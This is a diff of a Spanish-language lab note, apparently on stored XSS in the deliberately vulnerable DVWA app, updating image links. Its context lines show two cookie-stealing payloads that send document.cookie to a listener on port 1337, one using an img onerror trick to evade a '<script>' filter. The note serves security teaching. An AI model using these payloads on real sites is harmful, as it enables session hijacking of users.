@@ -9,8 +9,9 @@ _Contaminación de Lote en Cadena de Suministro_: Un producto manufacturado es a
 <script>window.location='http://127.0.0.1:1337//?cookie="+document.cookie</script>
 ```
 
+![Pasted ima7](../images/Pasted%20image%2020251204022932.png)        
 
-![[Pasted image 20251204022932.png]]Una vez que hagas clic en "Sign Guestbook":
+Una vez que hagas clic en "Sign Guestbook":
 
 1. **Redirección Inmediata:** Tu navegador debería ser expulsado de DVWA y enviado a tu servidor Python inmediatamente.
     
@@ -52,6 +53,7 @@ Puedes ejecutar JavaScript dentro de otros elementos HTML estándar usando **eve
 ```
 <img src=x onerror="window.location='http://192.168.122.1:1337/?cookie='+document.cookie">
 ```
-![[Pasted image 20251204023416.png]]
+![Pasted ima](../images/Pasted%20image%2020251204023416.png)
+
 
 **Resultado:** El filtro del servidor buscará la palabra `<script>`. Como no la encontrará (porque estás usando `<img>`), dejará pasar el mensaje. Cuando el navegador intente mostrar el comentario, la imagen fallará y te redirigirá a tu servidor con la cookie.
